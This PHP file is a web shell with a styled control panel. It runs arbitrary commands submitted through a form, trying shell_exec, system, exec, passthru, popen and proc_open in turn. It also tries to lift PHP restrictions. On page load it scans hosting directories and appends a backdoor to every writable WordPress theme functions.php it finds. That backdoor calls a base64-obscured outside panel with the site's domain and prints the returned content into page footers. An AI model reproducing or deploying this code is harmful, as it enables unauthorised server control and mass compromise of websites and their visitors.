<?php
/*
╔══════════════════════════════════════════════════════════════╗
║              FRIDA'S TESLA-LEVEL INJECTOR GUI                ║
║            Multi-Bypass Command Execution System             ║
║         WordPress Auto Injector Web Interface                ║
╚══════════════════════════════════════════════════════════════╝
*/

// Tesla-Level Security Bypass Initialization
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// Multi-Layer Bypass Functions
function frida_quantum_bypass() {
    $bypass_functions = [
        'safe_mode' => 0,
        'disable_functions' => '',
        'open_basedir' => '',
        'memory_limit' => '-1',
        'max_execution_time' => 0,
        'max_input_time' => 0,
    ];
    
    foreach ($bypass_functions as $setting => $value) {
        if (function_exists('ini_set')) {
            @ini_set($setting, $value);
        }
    }
    
    if (function_exists('set_time_limit')) {
        @set_time_limit(0);
    }
    
    return true;
}

// Tesla-Level Multi-Method Command Execution
function frida_execute_bypass($cmd) {
    frida_quantum_bypass();
    
    $output = '';
    $method_used = 'none';
    
    // Method 1: shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        try {
            $output = @shell_exec($cmd . ' 2>&1');
            if (!empty($output)) {
                $method_used = 'shell_exec';
                return ['method' => $method_used, 'output' => $output, 'success' => true];
            }
        } catch (Exception $e) {}
    }
    
    // Method 2: system
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        try {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
            if (!empty($output)) {
                $method_used = 'system';
                return ['method' => $method_used, 'output' => $output, 'success' => true];
            }
        } catch (Exception $e) {}
    }
    
    // Method 3: exec
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        try {
            @exec($cmd . ' 2>&1', $arr);
            $output = implode("\n", $arr);
            if (!empty($output)) {
                $method_used = 'exec';
                return ['method' => $method_used, 'output' => $output, 'success' => true];
            }
        } catch (Exception $e) {}
    }
    
    // Method 4: passthru
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        try {
            ob_start();
            @passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
            if (!empty($output)) {
                $method_used = 'passthru';
                return ['method' => $method_used, 'output' => $output, 'success' => true];
            }
        } catch (Exception $e) {}
    }
    
    // Method 5: popen
    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) {
        try {
            $handle = @popen($cmd . ' 2>&1', 'r');
            if ($handle) {
                while (!feof($handle)) {
                    $output .= fread($handle, 8192);
                }
                pclose($handle);
                if (!empty($output)) {
                    $method_used = 'popen';
                    return ['method' => $method_used, 'output' => $output, 'success' => true];
                }
            }
        } catch (Exception $e) {}
    }
    
    // Method 6: proc_open (Advanced bypass)
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        try {
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            
            $process = @proc_open($cmd, $descriptorspec, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($output)) {
                    $method_used = 'proc_open';
                    return ['method' => $method_used, 'output' => $output, 'success' => true];
                }
            }
        } catch (Exception $e) {}
    }
    
    return ['method' => 'none', 'output' => 'All execution methods blocked or failed', 'success' => false];
}

// WordPress Auto Injector Function
function frida_wp_injector($target_path = '') {
    frida_quantum_bypass();
    
    // Auto Injector Code
    $injection_code = "
function add_custom_footer_code(){\$exe=curl_init();curl_setopt_array(\$exe,[CURLOPT_URL=>base64_decode(\"aHR0cHM6Ly9wYW5lbC5oYWNrbGlua21hcmtldC5jb20vY29kZQ==\"),CURLOPT_HTTPHEADER=>[\"X-Request-Domain: \".((isset(\$_SERVER['HTTPS'])&&\$_SERVER['HTTPS']==='on')?\"https://\":\"http://\").\$_SERVER['HTTP_HOST'].\"/\"],CURLOPT_RETURNTRANSFER=>true]);\$response=curl_exec(\$exe);curl_close(\$exe);echo \$response;}add_action('wp_footer','add_custom_footer_code');";
    
    // Get current working directory and build smart paths
    $current_dir = getcwd();
    $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
    
    // Universal hosting paths + smart detection
    $search_paths = [
        '/home/',
        '/var/www/',
        '/var/www/html/',
        '/var/www/vhosts/',
        '/usr/local/www/',
        '/opt/lampp/htdocs/',
        '/srv/http/',
        '/srv/www/',
        '/var/lib/www/',
        '/usr/share/nginx/html/',
        '/var/www/clients/',
        '/home/admin/web/',
    ];
    
    // Smart path detection from current location
    if (!empty($current_dir)) {
        // Extract user home from current path
        if (preg_match('/^\/home\/([^\/]+)/', $current_dir, $matches)) {
            $user_home = '/home/' . $matches[1] . '/';
            $search_paths[] = $user_home;
            $search_paths[] = $user_home . 'domains/';
            $search_paths[] = $user_home . 'public_html/';
        }
    }
    
    // Add document root path
    if (!empty($document_root)) {
        $search_paths[] = $document_root;
        $search_paths[] = dirname($document_root) . '/';
    }
    
    if (!empty($target_path)) {
        $search_paths = [$target_path];
    }
    
    // Remove duplicates and sort
    $search_paths = array_unique($search_paths);
    
    $total_injected = 0;
    $total_skipped = 0;
    $results = [];
    
    foreach ($search_paths as $path) {
        $results[] = "🔍 Checking path: $path";
        
        if (!is_dir($path)) {
            $results[] = "   ❌ Directory does not exist";
            continue;
        }
        
        if (!is_readable($path)) {
            $results[] = "   🔒 Directory not readable";
            continue;
        }
        
        $results[] = "   ✅ Directory accessible";
        
        // Find WordPress functions.php files
        $find_cmd = "find '$path' -path '*/wp-content/themes/*' -name 'functions.php' 2>/dev/null";
        $result = frida_execute_bypass($find_cmd);
        
        $results[] = "   🔧 Find command executed via: " . $result['method'];
        
        if ($result['success'] && !empty($result['output'])) {
            $files = explode("\n", trim($result['output']));
            $results[] = "   📁 Found " . count(array_filter($files)) . " functions.php files";
            
            foreach ($files as $file) {
                if (empty($file)) continue;
                
                $results[] = "      📄 Processing: $file";
                
                // Check if code already exists
                if (file_exists($file) && is_readable($file)) {
                    $content = file_get_contents($file);
                    if (strpos($content, 'add_custom_footer_code') !== false) {
                        $total_skipped++;
                        $results[] = "      ⏭️ ALREADY EXISTS - " . basename(dirname($file)) . "/functions.php";
                        continue;
                    }
                    
                    // Inject code
                    if (is_writable($file)) {
                        if (file_put_contents($file, "\n" . $injection_code, FILE_APPEND | LOCK_EX)) {
                            $total_injected++;
                            $results[] = "      ✅ INJECTED - " . basename(dirname($file)) . "/functions.php";
                        } else {
                            $results[] = "      ❌ WRITE FAILED - " . basename(dirname($file)) . "/functions.php";
                        }
                    } else {
                        $results[] = "      🔒 NO WRITE PERMISSION - " . basename(dirname($file)) . "/functions.php";
                    }
                } else {
                    $results[] = "      ❌ FILE NOT ACCESSIBLE - $file";
                }
            }
        } else {
            $results[] = "   ❌ Find command failed or no output";
            if (!empty($result['output'])) {
                $results[] = "   📝 Output: " . substr($result['output'], 0, 200);
            }
        }
    }
    
    return [
        'total_injected' => $total_injected,
        'total_skipped' => $total_skipped,
        'results' => $results,
        'search_paths' => $search_paths
    ];
}

// Tesla-Level Site Ping Function
function frida_ping_sites($domains_text, $timeout = 10) {
    frida_quantum_bypass();
    
    $domains = array_filter(array_map('trim', explode("\n", $domains_text)));
    $results = [];
    $online_count = 0;
    $offline_count = 0;
    $total_response_time = 0;
    $valid_responses = 0;
    
    foreach ($domains as $domain) {
        // Clean domain
        $clean_domain = preg_replace('/^https?:\/\//', '', $domain);
        $clean_domain = preg_replace('/^www\./', '', $clean_domain);
        $clean_domain = rtrim($clean_domain, '/');
        
        if (empty($clean_domain)) continue;
        
        $start_time = microtime(true);
        
        // Try HTTPS first, then HTTP
        $urls = [
            "https://$clean_domain",
            "http://$clean_domain"
        ];
        
        $success = false;
        $response_time = 0;
        $status_code = 0;
        $error_msg = '';
        
        foreach ($urls as $url) {
            // Use cURL for better control
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => $timeout,
                CURLOPT_CONNECTTIMEOUT => $timeout,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                CURLOPT_NOBODY => true, // HEAD request only
                CURLOPT_HEADER => false
            ]);
            
            $response = curl_exec($ch);
            $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME) * 1000; // Convert to ms
            $error = curl_error($ch);
            curl_close($ch);
            
            if ($status_code >= 200 && $status_code < 400) {
                $success = true;
                $response_time = $total_time;
                break;
            } else {
                $error_msg = $error ?: "HTTP $status_code";
            }
        }
        
        $end_time = microtime(true);
        $total_time_ms = ($end_time - $start_time) * 1000;
        
        if ($success) {
            $online_count++;
            $total_response_time += $response_time;
            $valid_responses++;
            $results[] = "✅ $clean_domain - ONLINE ({$response_time}ms) [HTTP $status_code]";
        } else {
            $offline_count++;
            $results[] = "❌ $clean_domain - OFFLINE ({$error_msg})";
        }
    }
    
    $avg_response_time = $valid_responses > 0 ? $total_response_time / $valid_responses : 0;
    
    return [
        'online_count' => $online_count,
        'offline_count' => $offline_count,
        'avg_response_time' => $avg_response_time,
        'results' => $results
    ];
}

// Get available execution methods
function get_available_methods() {
    $methods = ['shell_exec', 'system', 'exec', 'passthru', 'popen', 'proc_open'];
    $disabled = explode(',', str_replace(' ', '', ini_get('disable_functions')));
    $available = [];
    
    foreach ($methods as $method) {
        if (function_exists($method) && !in_array($method, $disabled)) {
            $available[] = $method;
        }
    }
    
    return $available;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Frida's Tesla WordPress Auto Injector</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff88;
            min-height: 100vh;
            padding: 20px;
        }
        
        .tesla-header {
            background: linear-gradient(90deg, #ff006e, #fb5607, #ffbe0b, #8338ec, #3a86ff);
            padding: 20px;
            text-align: center;
            border-radius: 15px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .tesla-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            animation: tesla-glow 3s infinite;
        }
        
        @keyframes tesla-glow {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .tesla-title {
            font-size: 2rem;
            font-weight: bold;
            text-shadow: 0 0 20px #00ff88;
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        .panel {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #00ff88;
            border-radius: 15px;
            padding: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 255, 136, 0.2);
        }
        
        .panel:hover {
            border-color: #ff006e;
            box-shadow: 0 12px 40px rgba(255, 0, 110, 0.3);
        }
        
        .panel-title {
            font-size: 1.3rem;
            margin-bottom: 15px;
            color: #ff006e;
            text-shadow: 0 0 10px #ff006e;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ff88;
            font-weight: bold;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.3);
            border: 2px solid #00ff88;
            border-radius: 8px;
            color: #00ff88;
            font-family: inherit;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #ff006e;
            box-shadow: 0 0 15px rgba(255, 0, 110, 0.5);
        }
        
        .btn {
            background: linear-gradient(45deg, #ff006e, #3a86ff);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 1rem;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(255, 0, 110, 0.4);
        }
        
        .output {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #00ff88;
            border-radius: 8px;
            padding: 15px;
            white-space: pre-wrap;
            font-family: 'Consolas', monospace;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
            color: #00ff88;
            text-shadow: 0 0 5px #00ff88;
        }
        
        .full-width {
            grid-column: 1 / -1;
        }
        
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-ok { background: #00ff88; }
        .status-blocked { background: #ff006e; }
        
        .method-list {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 10px 0;
        }
        
        .method-tag {
            background: rgba(0, 255, 136, 0.2);
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.8rem;
            border: 1px solid #00ff88;
        }
        
        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="tesla-header">
        <div class="tesla-title">⚡ FRIDA'S TESLA WORDPRESS AUTO INJECTOR ⚡</div>
        <div>🚀 AUTO-EXECUTION MODE | Multi-Bypass | Universal Detection | Tesla-Level Injection</div>
    </div>

    <div class="container">
        <!-- Auto Injector Panel -->
        <div class="panel">
            <div class="panel-title">🎯 WordPress Auto Injector</div>
            <form method="POST">
                <div class="form-group">
                    <label>Target Path (leave empty for auto-scan):</label>
                    <input type="text" name="target_path" placeholder="/home/ or /var/www/ or leave empty" value="<?= htmlspecialchars($_POST['target_path'] ?? '') ?>">
                </div>
                <button type="submit" name="action" value="auto_inject" class="btn">🔄 Re-run Auto Injector</button>
            </form>
            
            <?php 
            // Auto-run injector on page load
            $auto_run = !isset($_POST['action']) || $_POST['action'] === 'auto_inject';
            if ($auto_run): ?>
                <div class="output">
                    <?php
                    $target_path = $_POST['target_path'] ?? '';
                    $result = frida_wp_injector($target_path);
                    
                    echo "🎯 TESLA AUTO INJECTOR RESULTS:\n";
                    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
                    echo "📊 STATISTICS:\n";
                    echo "✅ Total Injected: " . $result['total_injected'] . "\n";
                    echo "⏭️ Total Skipped: " . $result['total_skipped'] . "\n";
                    echo "🔍 Searched Paths: " . count($result['search_paths']) . "\n\n";
                    
                    echo "📁 SEARCH PATHS:\n";
                    foreach ($result['search_paths'] as $path) {
                        echo "  • $path\n";
                    }
                    echo "\n";
                    
                    echo "📝 DETAILED RESULTS:\n";
                    if (!empty($result['results'])) {
                        foreach ($result['results'] as $res) {
                            echo "$res\n";
                        }
                    } else {
                        echo "❌ No WordPress installations found or no accessible paths.\n";
                    }
                    
                    echo "\n🚀 Tesla-Level injection complete! ⚡";
                    ?>
                </div>
            <?php endif; ?>
        </div>

        <!-- Command Execution Panel -->
        <div class="panel">
            <div class="panel-title">⚡ Tesla Command Executor</div>
            <form method="POST">
                <div class="form-group">
                    <label>Custom Command:</label>
                    <textarea name="command" rows="3" placeholder="Enter your command..."><?= htmlspecialchars($_POST['command'] ?? '') ?></textarea>
                </div>
                <button type="submit" name="action" value="execute" class="btn">⚡ Execute Command</button>
            </form>
            
            <?php if (isset($_POST['action']) && $_POST['action'] === 'execute' && !empty($_POST['command'])): ?>
                <div class="output">
                    <?php
                    $result = frida_execute_bypass($_POST['command']);
                    echo "Execution Method: " . htmlspecialchars($result['method']) . "\n";
                    echo "Success: " . ($result['success'] ? 'YES' : 'NO') . "\n";
                    echo "Output:\n" . htmlspecialchars($result['output']);
                    ?>
                </div>
            <?php endif; ?>
        </div>

        <!-- Site Ping Panel -->
        <div class="panel">
            <div class="panel-title">🌐 Tesla Site Ping & Status</div>
            <form method="POST">
                <div class="form-group">
                    <label>Domains to Ping (one per line):</label>
                    <textarea name="ping_domains" rows="5" placeholder="google.com
github.com
example.com"><?= htmlspecialchars($_POST['ping_domains'] ?? '') ?></textarea>
                </div>
                <div class="form-group">
                    <label>Timeout (seconds):</label>
                    <input type="number" name="ping_timeout" value="<?= htmlspecialchars($_POST['ping_timeout'] ?? '10') ?>" min="1" max="60">
                </div>
                <button type="submit" name="action" value="ping_sites" class="btn">🚀 Ping Sites</button>
            </form>
            
            <?php if (isset($_POST['action']) && $_POST['action'] === 'ping_sites'): ?>
                <div class="output">
                    <?php
                    $domains = $_POST['ping_domains'] ?? '';
                    $timeout = (int)($_POST['ping_timeout'] ?? 10);
                    $ping_results = frida_ping_sites($domains, $timeout);
                    
                    echo "🌐 TESLA SITE PING RESULTS:\n";
                    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
                    echo "📊 PING STATISTICS:\n";
                    echo "✅ Total Online: " . $ping_results['online_count'] . "\n";
                    echo "❌ Total Offline: " . $ping_results['offline_count'] . "\n";
                    echo "⏱️ Average Response Time: " . number_format($ping_results['avg_response_time'], 2) . "ms\n\n";
                    
                    echo "📝 DETAILED RESULTS:\n";
                    foreach ($ping_results['results'] as $result) {
                        echo $result . "\n";
                    }
                    ?>
                </div>
            <?php endif; ?>
        </div>

        <!-- System Status Panel -->
        <div class="panel full-width">
            <div class="panel-title">🔬 Tesla System Status</div>
            <div class="output">
                <?php
                $available_methods = get_available_methods();
                $disabled_functions = ini_get('disable_functions');
                
                echo "🔧 AVAILABLE EXECUTION METHODS:\n";
                if (!empty($available_methods)) {
                    foreach ($available_methods as $method) {
                        echo "  ✅ $method\n";
                    }
                } else {
                    echo "  ❌ No execution methods available\n";
                }
                
                echo "\n🚫 DISABLED FUNCTIONS:\n";
                if (!empty($disabled_functions)) {
                    $disabled = explode(',', str_replace(' ', '', $disabled_functions));
                    foreach ($disabled as $func) {
                        if (!empty($func)) echo "  🔒 $func\n";
                    }
                } else {
                    echo "  ✅ No functions disabled\n";
                }
                
                echo "\n📊 SYSTEM INFO:\n";
                echo "  PHP Version: " . phpversion() . "\n";
                echo "  Operating System: " . php_uname() . "\n";
                echo "  Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "\n";
                echo "  Document Root: " . ($_SERVER['DOCUMENT_ROOT'] ?? 'Unknown') . "\n";
                echo "  Current Directory: " . getcwd() . "\n";
                ?>
            </div>
        </div>
    </div>

    <script>
        console.log(`
        ╔══════════════════════════════════════════════════════════════╗
        ║              FRIDA'S TESLA AUTO INJECTOR LOADED              ║
        ║                 Multi-Bypass System Active                   ║
        ╚══════════════════════════════════════════════════════════════╝
        `);
    </script>
</body>
</html>
